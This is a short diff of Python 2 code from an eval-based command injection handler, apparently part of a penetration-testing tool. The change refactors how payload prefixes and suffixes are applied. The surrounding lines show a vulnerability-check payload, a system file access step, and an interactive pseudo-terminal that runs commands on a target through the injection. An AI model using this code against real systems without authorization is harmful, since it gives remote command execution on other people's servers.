@@ -78,20 +78,10 @@ def eb_injection_handler(url, delay, filename, http_request_method):
         try:
           # Eval-based decision payload (check if host is vulnerable).
           payload = eb_payloads.decision(separator, TAG, randv1, randv2)
-
-          # Check if defined "--prefix" option.
-          if menu.options.prefix:
-            prefix = menu.options.prefix
-            payload = prefix + payload
-          else:
-            payload = prefix + payload
-            
-          # Check if defined "--suffix" option.
-          if menu.options.suffix:
-            suffix = menu.options.suffix
-            payload = payload + suffix
-          else:
-            payload = payload + suffix
+          
+          # Fix prefixes / suffixes
+          payload = parameters.prefixes(payload, prefix)
+          payload = parameters.suffixes(payload, suffix)
       
           payload = payload + "" + TAG + ""
           payload = re.sub(" ", "%20", payload)
@@ -194,11 +184,12 @@ def eb_injection_handler(url, delay, filename, http_request_method):
 
           # Check for any system file access options.
           eb_file_access.do_check(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter)
-          
+
           # Pseudo-Terminal shell
           while True:
             gotshell = raw_input("\n(?) Do you want a Pseudo-Terminal shell? [Y/n] > ").lower()
             if gotshell in settings.CHOISE_YES:
+
               print ""
               print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
               while True:
@@ -208,6 +199,7 @@ def eb_injection_handler(url, delay, filename, http_request_method):
                   if cmd == "q":
                     sys.exit(0)
                   else:
+
                     # The main command injection exploitation.
                     response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter)
                           
